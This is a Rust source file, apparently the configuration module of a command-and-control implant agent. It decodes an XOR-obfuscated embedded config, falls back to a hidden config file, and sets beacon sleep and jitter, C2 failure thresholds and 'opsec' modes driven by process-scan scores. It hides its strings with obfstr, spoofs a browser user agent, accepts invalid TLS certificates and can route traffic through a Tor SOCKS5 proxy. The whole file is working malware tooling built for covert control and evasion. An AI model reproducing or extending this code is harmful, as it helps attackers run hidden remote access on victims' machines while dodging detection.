use serde::{Deserialize, Serialize};
use std::fs;
use std::io;
use std::path::Path;
use std::env;
use log::{info, warn, error};
use reqwest::{Client, Proxy};
use obfstr::obfstr;

// Include the generated config file
include!(concat!(env!("OUT_DIR"), "/config.rs"));

// Helper function to deobfuscate the config
fn deobfuscate_config(hex_content: &str, key_str: &str) -> Result<String, String> {
    let key_bytes = key_str.as_bytes();
    let mut obfuscated_bytes = Vec::new();
    for i in (0..hex_content.len()).step_by(2) {
        let byte_str = hex_content.get(i..i+2).ok_or_else(|| "Invalid hex string length".to_string())?;
        let byte = u8::from_str_radix(byte_str, 16).map_err(|e| format!("Invalid hex character: {}", e))?;
        obfuscated_bytes.push(byte);
    }

    for (i, byte) in obfuscated_bytes.iter_mut().enumerate() {
        *byte ^= key_bytes[i % key_bytes.len()];
    }
    String::from_utf8(obfuscated_bytes).map_err(|e| format!("Deobfuscated config is not valid UTF-8: {}", e))
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct AgentConfig {
    pub server_url: String,
    pub sleep_interval: u64,
    pub jitter: u64,
    pub payload_id: String,
    pub protocol: String,
    #[serde(default)]
    pub socks5_enabled: bool,
    #[serde(default = "default_socks5_host")]
    pub socks5_host: String,
    #[serde(default = "default_socks5_port")]
    pub socks5_port: u16,
    #[serde(default = "default_proc_scan_interval")]
    pub proc_scan_interval_secs: u64,
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_base_score_threshold_bg_to_reduced")]
    pub base_score_threshold_bg_to_reduced: f32,
    #[serde(default = "default_base_score_threshold_reduced_to_full")]
    pub base_score_threshold_reduced_to_full: f32,
    #[serde(default = "default_min_duration_full_opsec")]
    pub min_duration_full_opsec_secs: u64,
    #[serde(default = "default_min_duration_background_opsec")]
    pub min_duration_background_opsec_secs: u64,
    #[serde(default = "default_base_max_consecutive_c2_failures")]
    pub base_max_consecutive_c2_failures: u32,
    #[serde(default = "default_min_duration_reduced_activity_secs")]
    pub min_duration_reduced_activity_secs: u64,
    #[serde(default = "default_reduced_activity_sleep_secs")]
    pub reduced_activity_sleep_secs: u64,
    #[serde(default = "default_c2_failure_threshold_increase_factor")]
    pub c2_failure_threshold_increase_factor: f32,
    #[serde(default = "default_c2_failure_threshold_decrease_factor")]
    pub c2_failure_threshold_decrease_factor: f32,
    #[serde(default = "default_c2_threshold_adjust_interval_secs")]
    pub c2_threshold_adjust_interval_secs: u64,
    #[serde(default = "default_c2_dynamic_threshold_max_multiplier")]
    pub c2_dynamic_threshold_max_multiplier: f32,
}

fn default_socks5_host() -> String {
    obfstr!("127.0.0.1").to_string()
}

fn default_socks5_port() -> u16 {
    9050
}

fn default_proc_scan_interval() -> u64 { 300 }

fn default_user_agent() -> String {
    // Use a common browser user agent as default
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36".to_string()
}

fn default_base_score_threshold_bg_to_reduced() -> f32 {
    20.0
}

fn default_base_score_threshold_reduced_to_full() -> f32 {
    60.0
}

fn default_min_duration_full_opsec() -> u64 {
    300 // Default 5 minutes in FullOpsec
}

fn default_min_duration_background_opsec() -> u64 {
    60 // Default 1 minute in BackgroundOpsec
}

fn default_base_max_consecutive_c2_failures() -> u32 {
    5 // Default: trigger signal after 5 consecutive failures
}

fn default_min_duration_reduced_activity_secs() -> u64 {
    120 // Default 2 minutes in ReducedActivity
}

fn default_reduced_activity_sleep_secs() -> u64 {
    120 // Default 2 minutes sleep for ReducedActivity
}

fn default_c2_failure_threshold_increase_factor() -> f32 {
    1.0 // Default: No increase
}

fn default_c2_failure_threshold_decrease_factor() -> f32 {
    1.0 // Default: No decrease
}

fn default_c2_threshold_adjust_interval_secs() -> u64 {
    u64::MAX // Default: Effectively disable periodic adjustment
}

fn default_c2_dynamic_threshold_max_multiplier() -> f32 {
    1.0 // Default: Dynamic threshold cannot exceed base threshold
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: String::new(),
            sleep_interval: 5,
            jitter: 2,
            payload_id: String::new(),
            protocol: obfstr!("http").to_string(),
            socks5_enabled: false,
            socks5_host: obfstr!("127.0.0.1").to_string(),
            socks5_port: 9050,
            proc_scan_interval_secs: default_proc_scan_interval(),
            user_agent: default_user_agent(),
            base_score_threshold_bg_to_reduced: default_base_score_threshold_bg_to_reduced(),
            base_score_threshold_reduced_to_full: default_base_score_threshold_reduced_to_full(),
            min_duration_full_opsec_secs: default_min_duration_full_opsec(),
            min_duration_background_opsec_secs: default_min_duration_background_opsec(),
            base_max_consecutive_c2_failures: default_base_max_consecutive_c2_failures(),
            min_duration_reduced_activity_secs: default_min_duration_reduced_activity_secs(),
            reduced_activity_sleep_secs: default_reduced_activity_sleep_secs(),
            c2_failure_threshold_increase_factor: default_c2_failure_threshold_increase_factor(),
            c2_failure_threshold_decrease_factor: default_c2_failure_threshold_decrease_factor(),
            c2_threshold_adjust_interval_secs: default_c2_threshold_adjust_interval_secs(),
            c2_dynamic_threshold_max_multiplier: default_c2_dynamic_threshold_max_multiplier(),
        }
    }
}

// The AgentConfig struct is used to load and manage the agent's configuration.
impl AgentConfig {
    pub fn load() -> io::Result<Self> {
        // First try using the embedded config
        match deobfuscate_config(EMBEDDED_CONFIG_HEX, EMBEDDED_CONFIG_XOR_KEY) {
            Ok(deobfuscated_json) => {
                if let Ok(config) = serde_json::from_str::<AgentConfig>(&deobfuscated_json) {
                    if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                        return Ok(config);
                    }
                    warn!("[WARNING] Embedded config invalid after deobfuscation (missing server_url or payload_id)");
                } else {
                    warn!("[WARNING] Failed to parse deobfuscated embedded config");
                }
            },
            Err(e) => {
                warn!("[WARNING] Failed to deobfuscate embedded config: {}", e);
            }
        }
        
        // Try filesystem config as fallback
        if let Ok(exe_path) = env::current_exe() {
            let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
            let config_path = exe_dir.join(".config").join("config.json");
            
            if config_path.exists() {
                if let Ok(contents) = fs::read_to_string(&config_path) {
                    if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
                        if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                            return Ok(config);
                        }
                    }
                }
            }
        }

        // No valid config found
        Err(io::Error::new(io::ErrorKind::NotFound, "No valid configuration found"))
    }

    pub fn get_server_url(&self) -> String {
        if self.server_url.starts_with("http://") || self.server_url.starts_with("https://") {
            self.server_url.clone()
        } else {
            format!("{}://{}", self.protocol, self.server_url)
        }
    }

    /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
    pub fn build_http_client(&self) -> Result<Client, io::Error> {
        let builder = Client::builder()
            .user_agent(self.user_agent.clone())
            .danger_accept_invalid_certs(true);

        if self.socks5_enabled {
            let proxy_url = format!("socks5h://{}:{}", self.socks5_host, self.socks5_port);
            info!("[HTTP] Building HTTP client with SOCKS5 proxy: {}", proxy_url);
            match builder
                .proxy(Proxy::all(&proxy_url).map_err(|e| {
                    error!("[HTTP] Invalid proxy URL: {}", e);
                    io::Error::new(io::ErrorKind::Other, format!("Invalid proxy URL: {}", e))
                })?)
                .build() {
                Ok(client) => Ok(client),
                Err(e) => {
                    error!("[HTTP] Failed to build HTTP client with SOCKS5 proxy: {}", e);
                    Err(io::Error::new(io::ErrorKind::Other, format!("Failed to build HTTP client with proxy: {}", e)))
                }
            }
        } else {
            info!("[HTTP] Building HTTP client with direct connection (no proxy)");
            builder
                .build()
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))
        }
    }
}
